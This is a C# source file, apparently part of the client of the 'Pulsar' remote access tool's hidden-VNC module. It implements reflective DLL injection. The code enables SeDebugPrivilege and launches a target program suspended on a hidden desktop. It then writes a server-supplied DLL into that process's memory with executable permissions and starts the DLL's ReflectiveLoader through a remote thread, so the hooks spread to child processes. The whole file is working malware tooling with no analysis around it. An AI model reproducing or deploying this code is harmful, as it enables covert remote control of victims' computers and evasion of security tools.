using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Helper.HVNC
{
    internal class KDOTInjector
    {
        /// <summary>
        /// Starts the reflective DLL injection process
        /// </summary>
        /// <param name="dllBytes">The DLL bytes to inject (received from server)</param>
        /// <param name="exePath">Path to the executable to start and inject into</param>
        /// <param name="searchPattern">Pattern to search for in the target process</param>
        /// <param name="replacementPath">Replacement path for the search pattern</param>
        public static void Start(byte[] dllBytes, string exePath, string searchPattern, string replacementPath)
        {
            try
            {
                if (dllBytes == null || dllBytes.Length == 0)
                {
                    Debug.WriteLine("[-] Invalid DLL bytes provided");
                    return;
                }

                if (string.IsNullOrWhiteSpace(exePath))
                {
                    Debug.WriteLine("[-] No target executable specified");
                    return;
                }

                if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                {
                    Debug.WriteLine("[-] Search pattern and replacement path are required");
                    return;
                }

                Debug.WriteLine($"[*] Starting reflective DLL injection");
                Debug.WriteLine($"    Target: {exePath}");
                Debug.WriteLine($"    Search Pattern: {searchPattern}");
                Debug.WriteLine($"    Replacement Path: {replacementPath}");
                Debug.WriteLine($"    DLL Size: {dllBytes.Length} bytes");

                PrivilegeManager.EnableDebugPrivilege();

                var (process, hProcess, hThread) = ProcessManager.StartProcessSuspended(exePath, searchPattern, replacementPath);
                if (process == null || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
                {
                    Debug.WriteLine("[-] Failed to create suspended process");
                    return;
                }

                int processId = process.Id;
                Debug.WriteLine($"[+] Started process '{Path.GetFileName(exePath)}' (suspended) with PID {processId}");

                try
                {
                    bool success = Injector.InjectDllWithHandle(hProcess, dllBytes);
                    if (success)
                    {
                        Debug.WriteLine($"[+] Successfully injected '{Path.GetFileName(exePath)}' into process {processId}");
                        Debug.WriteLine($"[+] Search pattern: {searchPattern}");
                        Debug.WriteLine($"[+] Replacement path: {replacementPath}");
                    }
                    else
                    {
                        Debug.WriteLine("[-] Injection failed");
                        Injector.CloseHandle(hProcess);
                        Injector.CloseHandle(hThread);
                        if (!process.HasExited)
                        {
                            process.Kill();
                        }
                        return;
                    }
                }
                finally
                {
                    Injector.CloseHandle(hProcess);
                }

                Debug.WriteLine("[+] Resuming main thread...");
                ProcessManager.ResumeThreadExP(hThread);
                Injector.CloseHandle(hThread);

                Debug.WriteLine("[+] Process running. DLL hooks will propagate to child processes.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[-] Exception in KDOTInjector.Start: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Manages process creation and interaction
    /// </summary>
    internal static class ProcessManager
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

        public static Process StartProcessNormal(string exePath)
        {
            if (!File.Exists(exePath))
            {
                Debug.WriteLine($"[-] Executable not found: {exePath}");
                return null;
            }

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    UseShellExecute = false,
                    WorkingDirectory = Path.GetDirectoryName(exePath)
                };

                Process process = Process.Start(psi);
                return process;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[-] Failed to start process: {ex.Message}");
                return null;
            }
        }

        private static IntPtr CreateEnvironmentBlock(string searchPath, string replacePath)
        {
            var envVars = Environment.GetEnvironmentVariables();

            var envDict = new Dictionary<string, string>();
            foreach (System.Collections.DictionaryEntry entry in envVars)
            {
                envDict[entry.Key.ToString()] = entry.Value.ToString();
            }

            envDict["RDI_SEARCH_PATH"] = searchPath;
            envDict["RDI_REPLACE_PATH"] = replacePath;

            var envList = new List<string>();
            foreach (var kvp in envDict.OrderBy(x => x.Key, StringComparer.OrdinalIgnoreCase))
            {
                envList.Add($"{kvp.Key}={kvp.Value}");
            }

            string envBlock = string.Join("\0", envList) + "\0\0";

            byte[] envBytes = Encoding.Unicode.GetBytes(envBlock);

            IntPtr envPtr = Marshal.AllocHGlobal(envBytes.Length);
            Marshal.Copy(envBytes, 0, envPtr, envBytes.Length);

            return envPtr;
        }

        public static (Process process, IntPtr hProcess, IntPtr hThread) StartProcessSuspended(string exePath, string searchPath, string replacePath)
        {
            if (!File.Exists(exePath))
            {
                Debug.WriteLine($"[-] Executable not found: {exePath}");
                return (null, IntPtr.Zero, IntPtr.Zero);
            }

            IntPtr envBlock = IntPtr.Zero;

            try
            {
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "PulsarDesktop";
                PROCESS_INFORMATION pi;

                string commandLine = $"\"{exePath}\"";

                envBlock = CreateEnvironmentBlock(searchPath, replacePath);

                Debug.WriteLine($"[*] Setting environment variables:");
                Debug.WriteLine($"  RDI_SEARCH_PATH={searchPath}");
                Debug.WriteLine($"  RDI_REPLACE_PATH={replacePath}");

                bool success = CreateProcess(
                    null,
                    commandLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT,
                    envBlock,
                    Path.GetDirectoryName(exePath),
                    ref si,
                    out pi);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    Debug.WriteLine($"[-] Failed to create process. Error: {error}");
                    return (null, IntPtr.Zero, IntPtr.Zero);
                }

                Process process = Process.GetProcessById((int)pi.dwProcessId);

                return (process, pi.hProcess, pi.hThread);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[-] Failed to start process: {ex.Message}");
                return (null, IntPtr.Zero, IntPtr.Zero);
            }
            finally
            {
                if (envBlock != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(envBlock);
                }
            }
        }

        public static void ResumeThreadExP(IntPtr hThread)
        {
            if (hThread != IntPtr.Zero)
            {
                uint suspendCount = ResumeThread(hThread);
                if (suspendCount == unchecked((uint)-1))
                {
                    Debug.WriteLine($"[-] Failed to resume thread. Error: {Marshal.GetLastWin32Error()}");
                }
            }
        }
    }

    /// <summary>
    /// Manages Windows privileges (SeDebugPrivilege)
    /// </summary>
    internal static class PrivilegeManager
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            uint BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const string SE_DEBUG_NAME = "SeDebugPrivilege";

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        public static void EnableDebugPrivilege()
        {
            try
            {
                IntPtr hToken;
                if (OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                {
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                    {
                        PrivilegeCount = 1,
                        Privileges = new LUID_AND_ATTRIBUTES
                        {
                            Attributes = SE_PRIVILEGE_ENABLED
                        }
                    };

                    if (LookupPrivilegeValue(null, SE_DEBUG_NAME, out tp.Privileges.Luid))
                    {
                        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                    }

                    CloseHandle(hToken);
                }
            }
            catch
            {
                // windows basically just gave us the middle finger
            }
        }
    }

    /// <summary>
    /// Handles DLL injection using reflective loading
    /// </summary>
    internal static class Injector
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        private const uint INFINITE = 0xFFFFFFFF;

        [Flags]
        private enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            All = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
        }

        [Flags]
        private enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000
        }

        [Flags]
        private enum MemoryProtection : uint
        {
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_READWRITE = 0x04
        }

        public static bool InjectDll(int processId, byte[] dllBuffer)
        {
            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                Debug.WriteLine($"[-] Failed to open target process. Error={Marshal.GetLastWin32Error()}");
                return false;
            }

            try
            {
                IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer);
                if (hThread == IntPtr.Zero)
                {
                    Debug.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
                    return false;
                }

                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
                return true;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }

        public static bool InjectDllWithHandle(IntPtr hProcess, byte[] dllBuffer)
        {
            if (hProcess == IntPtr.Zero || dllBuffer == null || dllBuffer.Length == 0)
            {
                Debug.WriteLine("[-] Invalid parameters for injection");
                return false;
            }

            IntPtr hThread = LoadRemoteLibraryR(hProcess, dllBuffer);
            if (hThread == IntPtr.Zero)
            {
                Debug.WriteLine($"[-] Failed to inject DLL. Error={Marshal.GetLastWin32Error()}");
                return false;
            }

            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            return true;
        }

        private static IntPtr LoadRemoteLibraryR(IntPtr hProcess, byte[] buffer)
        {
            try
            {
                if (hProcess == IntPtr.Zero || buffer == null || buffer.Length == 0)
                    return IntPtr.Zero;

                uint reflectiveLoaderOffset = PEParser.GetReflectiveLoaderOffset(buffer);
                if (reflectiveLoaderOffset == 0)
                {
                    Debug.WriteLine("[-] Failed to find ReflectiveLoader in DLL");
                    return IntPtr.Zero;
                }

                IntPtr lpRemoteLibraryBuffer = VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (uint)buffer.Length,
                    AllocationType.MEM_RESERVE | AllocationType.MEM_COMMIT,
                    MemoryProtection.PAGE_EXECUTE_READWRITE);

                if (lpRemoteLibraryBuffer == IntPtr.Zero)
                {
                    Debug.WriteLine("[-] Failed to allocate memory in remote process");
                    return IntPtr.Zero;
                }

                IntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buffer, (uint)buffer.Length, out bytesWritten))
                {
                    Debug.WriteLine("[-] Failed to write DLL to remote process");
                    return IntPtr.Zero;
                }

                IntPtr lpReflectiveLoader = IntPtr.Add(lpRemoteLibraryBuffer, (int)reflectiveLoaderOffset);

                IntPtr threadId;
                IntPtr hThread = CreateRemoteThread(
                    hProcess,
                    IntPtr.Zero,
                    1024 * 1024,
                    lpReflectiveLoader,
                    IntPtr.Zero,
                    0,
                    out threadId);

                return hThread;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[-] Exception in LoadRemoteLibraryR: {ex.Message}");
                return IntPtr.Zero;
            }
        }
    }

    /// <summary>
    /// Parses PE (Portable Executable) file format
    /// </summary>
    internal static class PEParser
    {
        #region PE Structures

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res;

            public ushort e_oemid;
            public ushort e_oeminfo;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;

            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER32
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;

            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;
            public uint AddressOfNames;
            public uint AddressOfNameOrdinals;
        }

        private const int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;
        private const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b;
        private const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;

        #endregion PE Structures

        public static uint GetReflectiveLoaderOffset(byte[] buffer)
        {
            try
            {
                int baseAddress = 0;

                IMAGE_DOS_HEADER dosHeader = ByteArrayToStructure<IMAGE_DOS_HEADER>(buffer, 0);

                int ntHeadersOffset = baseAddress + dosHeader.e_lfanew;

                uint signature = BitConverter.ToUInt32(buffer, ntHeadersOffset);
                if (signature != 0x00004550) // "PE\0\0"
                    return 0;

                IMAGE_FILE_HEADER fileHeader = ByteArrayToStructure<IMAGE_FILE_HEADER>(buffer, ntHeadersOffset + 4);

                int optionalHeaderOffset = ntHeadersOffset + 4 + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER));
                ushort magic = BitConverter.ToUInt16(buffer, optionalHeaderOffset);

                uint exportDirRva;

                if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) // PE32
                {
                    if (IntPtr.Size != 4)
                        return 0;

                    IMAGE_OPTIONAL_HEADER32 optHeader = ByteArrayToStructure<IMAGE_OPTIONAL_HEADER32>(buffer, optionalHeaderOffset);
                    exportDirRva = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                }
                else if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) // PE64
                {
                    if (IntPtr.Size != 8)
                        return 0;

                    IMAGE_OPTIONAL_HEADER64 optHeader = ByteArrayToStructure<IMAGE_OPTIONAL_HEADER64>(buffer, optionalHeaderOffset);
                    exportDirRva = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                }
                else
                {
                    return 0;
                }

                if (exportDirRva == 0)
                    return 0;

                uint exportDirOffset = Rva2Offset(exportDirRva, buffer, baseAddress);
                if (exportDirOffset == 0)
                    return 0;

                IMAGE_EXPORT_DIRECTORY exportDir = ByteArrayToStructure<IMAGE_EXPORT_DIRECTORY>(buffer, (int)exportDirOffset);

                uint nameArrayOffset = Rva2Offset(exportDir.AddressOfNames, buffer, baseAddress);
                uint addressArrayOffset = Rva2Offset(exportDir.AddressOfFunctions, buffer, baseAddress);
                uint nameOrdinalsOffset = Rva2Offset(exportDir.AddressOfNameOrdinals, buffer, baseAddress);

                for (uint i = 0; i < exportDir.NumberOfNames; i++)
                {
                    uint nameRva = BitConverter.ToUInt32(buffer, (int)(nameArrayOffset + i * 4));
                    uint nameOffset = Rva2Offset(nameRva, buffer, baseAddress);

                    string functionName = ReadNullTerminatedString(buffer, (int)nameOffset);

                    if (functionName.Contains("ReflectiveLoader"))
                    {
                        ushort ordinal = BitConverter.ToUInt16(buffer, (int)(nameOrdinalsOffset + i * 2));
                        uint functionRva = BitConverter.ToUInt32(buffer, (int)(addressArrayOffset + ordinal * 4));
                        return Rva2Offset(functionRva, buffer, baseAddress);
                    }
                }
            }
            catch
            {
                return 0;
            }

            return 0;
        }

        private static uint Rva2Offset(uint dwRva, byte[] buffer, int baseAddress)
        {
            IMAGE_DOS_HEADER dosHeader = ByteArrayToStructure<IMAGE_DOS_HEADER>(buffer, 0);
            int ntHeadersOffset = baseAddress + dosHeader.e_lfanew;

            IMAGE_FILE_HEADER fileHeader = ByteArrayToStructure<IMAGE_FILE_HEADER>(buffer, ntHeadersOffset + 4);
            int sectionHeaderOffset = ntHeadersOffset + 4 + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) + fileHeader.SizeOfOptionalHeader;

            IMAGE_SECTION_HEADER firstSection = ByteArrayToStructure<IMAGE_SECTION_HEADER>(buffer, sectionHeaderOffset);

            if (dwRva < firstSection.PointerToRawData)
                return dwRva;

            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER section = ByteArrayToStructure<IMAGE_SECTION_HEADER>(buffer, sectionHeaderOffset + i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));

                if (dwRva >= section.VirtualAddress && dwRva < section.VirtualAddress + section.SizeOfRawData)
                {
                    return dwRva - section.VirtualAddress + section.PointerToRawData;
                }
            }

            return 0;
        }

        private static T ByteArrayToStructure<T>(byte[] bytes, int offset) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            IntPtr ptr = Marshal.AllocHGlobal(size);
            try
            {
                Marshal.Copy(bytes, offset, ptr, size);
                return (T)Marshal.PtrToStructure(ptr, typeof(T));
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }
        }

        private static string ReadNullTerminatedString(byte[] buffer, int offset)
        {
            int length = 0;
            while (offset + length < buffer.Length && buffer[offset + length] != 0)
            {
                length++;
            }
            return Encoding.ASCII.GetString(buffer, offset, length);
        }
    }
}